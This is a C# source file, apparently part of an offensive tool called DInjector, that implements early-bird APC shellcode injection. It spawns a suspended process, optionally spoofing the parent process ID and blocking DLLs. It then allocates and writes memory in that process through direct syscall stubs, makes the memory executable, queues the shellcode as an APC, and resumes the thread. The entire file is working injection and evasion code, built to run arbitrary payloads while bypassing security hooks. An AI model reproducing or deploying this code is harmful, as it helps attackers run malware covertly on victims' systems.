using System;
using System.Runtime.InteropServices;

using DI = DInvoke;

namespace DInjector
{
    class RemoteThreadAPC
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate Boolean CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            DI.Data.Win32.Advapi32.CREATION_FLAGS dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref DI.Data.Win32.ProcessThreadsAPI._STARTUPINFO lpStartupInfo,
            out DI.Data.Win32.ProcessThreadsAPI._PROCESS_INFORMATION lpProcessInformation);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS NtAllocateVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            ref IntPtr RegionSize,
            uint AllocationType,
            uint Protect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS NtWriteVirtualMemory(
            IntPtr ProcessHandle,
            IntPtr BaseAddress,
            IntPtr Buffer,
            uint BufferLength,
            ref uint BytesWritten);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS NtProtectVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            ref IntPtr RegionSize,
            uint NewProtect,
            out uint OldProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS NtOpenThread(
            ref IntPtr ThreadHandle,
            DI.Data.Win32.Kernel32.ThreadAccess dwDesiredAccess,
            ref OBJECT_ATTRIBUTES ObjectAttributes,
            ref CLIENT_ID ClientId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS NtQueueApcThread(
            IntPtr ThreadHandle,
            IntPtr ApcRoutine,
            IntPtr ApcArgument1,
            IntPtr ApcArgument2,
            IntPtr ApcArgument3);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS NtAlertResumeThread(
            IntPtr ThreadHandle,
            ref uint SuspendCount);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate bool CloseHandle(IntPtr hObject);

        [StructLayout(LayoutKind.Sequential, Pack = 0)]
        struct OBJECT_ATTRIBUTES
        {
            public int Length;
            public IntPtr RootDirectory;
            public IntPtr ObjectName;
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct CLIENT_ID
        {
            public IntPtr UniqueProcess;
            public IntPtr UniqueThread;
        }

        private static bool closeHandle(IntPtr hObject)
        {
            object[] parameters = { hObject };
            return (bool)DI.DynamicInvoke.Generic.DynamicAPIInvoke("kernel32.dll", "CloseHandle", typeof(CloseHandle), ref parameters);
        }

        public static void Execute(byte[] shellcodeBytes, string processImage, int ppid = 0, bool blockDlls = false)
        {
            var shellcode = shellcodeBytes;

            #region CreateProcessA

            var pi = SpawnProcess.Execute(
                processImage,
                @"C:\Windows\System32",
                suspended: true,
                ppid: ppid,
                blockDlls: blockDlls);

            #endregion

            #region NtAllocateVirtualMemory (PAGE_READWRITE)

            IntPtr stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtAllocateVirtualMemory");
            NtAllocateVirtualMemory sysNtAllocateVirtualMemory = (NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtAllocateVirtualMemory));

            IntPtr hProcess = pi.hProcess;
            IntPtr baseAddress = IntPtr.Zero;
            IntPtr regionSize = (IntPtr)shellcode.Length;
            DI.Data.Native.NTSTATUS ntstatus;

            ntstatus = sysNtAllocateVirtualMemory(
                hProcess,
                ref baseAddress,
                IntPtr.Zero,
                ref regionSize,
                DI.Data.Win32.Kernel32.MEM_COMMIT | DI.Data.Win32.Kernel32.MEM_RESERVE,
                DI.Data.Win32.WinNT.PAGE_READWRITE);

            if (ntstatus == 0)
                Console.WriteLine("(RemoteThreadAPC) [+] NtAllocateVirtualMemory, PAGE_READWRITE");
            else
                Console.WriteLine($"(RemoteThreadAPC) [-] NtAllocateVirtualMemory, PAGE_READWRITE: {ntstatus}");

            #endregion

            #region NtWriteVirtualMemory

            stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtWriteVirtualMemory");
            NtWriteVirtualMemory sysNtWriteVirtualMemory = (NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtWriteVirtualMemory));

            var buffer = Marshal.AllocHGlobal(shellcode.Length);
            Marshal.Copy(shellcode, 0, buffer, shellcode.Length);

            uint bytesWritten = 0;

            ntstatus = sysNtWriteVirtualMemory(
                hProcess,
                baseAddress,
                buffer,
                (uint)shellcode.Length,
                ref bytesWritten);

            if (ntstatus == 0)
                Console.WriteLine("(RemoteThreadAPC) [+] NtWriteVirtualMemory");
            else
                Console.WriteLine($"(RemoteThreadAPC) [-] NtWriteVirtualMemory: {ntstatus}");

            Marshal.FreeHGlobal(buffer);

            #endregion

            #region NtProtectVirtualMemory (PAGE_EXECUTE_READ)

            stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtProtectVirtualMemory");
            NtProtectVirtualMemory sysNtProtectVirtualMemory = (NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtProtectVirtualMemory));

            ntstatus = sysNtProtectVirtualMemory(
                hProcess,
                ref baseAddress,
                ref regionSize,
                DI.Data.Win32.WinNT.PAGE_EXECUTE_READ,
                out uint _);

            if (ntstatus == 0)
                Console.WriteLine("(RemoteThreadAPC) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READ");
            else
                Console.WriteLine($"(RemoteThreadAPC) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READ: {ntstatus}");

            #endregion

            #region NtOpenThread

            stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtOpenThread");
            NtOpenThread sysNtOpenThread = (NtOpenThread)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtOpenThread));

            IntPtr hThread = IntPtr.Zero;
            OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES();
            CLIENT_ID ci = new CLIENT_ID { UniqueThread = (IntPtr)pi.dwThreadId };

            ntstatus = sysNtOpenThread(
                ref hThread,
                DI.Data.Win32.Kernel32.ThreadAccess.SetContext,
                ref oa,
                ref ci);

            if (ntstatus == 0)
                Console.WriteLine("(RemoteThreadAPC) [+] NtOpenThread");
            else
                Console.WriteLine($"(RemoteThreadAPC) [-] NtOpenThread: {ntstatus}");

            #endregion

            #region NtQueueApcThread

            stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtQueueApcThread");
            NtQueueApcThread sysNtQueueApcThread = (NtQueueApcThread)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtQueueApcThread));

            ntstatus = sysNtQueueApcThread(
                hThread,
                baseAddress,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero);

            if (ntstatus == 0)
                Console.WriteLine("(RemoteThreadAPC) [+] NtQueueApcThread");
            else
                Console.WriteLine($"(RemoteThreadAPC) [-] NtQueueApcThread: {ntstatus}");

            #endregion

            #region NtAlertResumeThread

            stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtAlertResumeThread");
            NtAlertResumeThread sysNtAlertResumeThread = (NtAlertResumeThread)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtAlertResumeThread));
            
            uint suspendCount = 0;

            ntstatus = sysNtAlertResumeThread(
                pi.hThread,
                ref suspendCount);

            if (ntstatus == 0)
                Console.WriteLine("(RemoteThreadAPC) [+] NtAlertResumeThread");
            else
                Console.WriteLine($"(RemoteThreadAPC) [-] NtAlertResumeThread: {ntstatus}");

            #endregion

            closeHandle(hThread);
            closeHandle(hProcess);
        }
    }
}
